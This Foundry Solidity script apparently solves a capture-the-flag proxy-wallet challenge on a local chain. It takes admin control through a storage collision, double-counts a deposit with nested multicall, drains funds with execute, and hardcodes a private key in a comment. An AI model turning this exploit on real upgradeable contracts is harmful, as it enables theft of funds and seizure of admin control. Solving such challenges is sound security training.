// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external;
    function execute(address to, uint256 value, bytes calldata data) external;
    function multicall(bytes[] calldata data) external payable;
    function admin() external view returns (address);
}

contract Helper {
    bytes[] callInstance;
    bytes[] callInstance2;
    ITarget target_;

    function trigger(address target) public payable{
        target_ = ITarget(target);
        target_.proposeNewAdmin(address(this));
        target_.addToWhitelist(address(this));

        callInstance.push(abi.encodeWithSignature("deposit()"));
        callInstance2.push(abi.encodeWithSignature("deposit()"));
        callInstance.push(abi.encodeWithSignature("multicall(bytes[])", callInstance2));
        target_.multicall{value:1000000000000000}(callInstance);

        target_.execute(address(this), 2000000000000000, "");
        target_.setMaxBalance(uint256(uint160(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC))); // 내 지갑 주소
    }
    receive() external payable {

    }

}
contract SolveScript is Script {
    address public target = 0xb6410CE04122bDAe70D8F2f509e9814B51766618;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        console.log("admin : %s", ITarget(target).admin());
        helper.trigger{value:1000000000000000}(target);
        console.log("admin : %s", ITarget(target).admin());
        vm.stopBroadcast();
    }
}
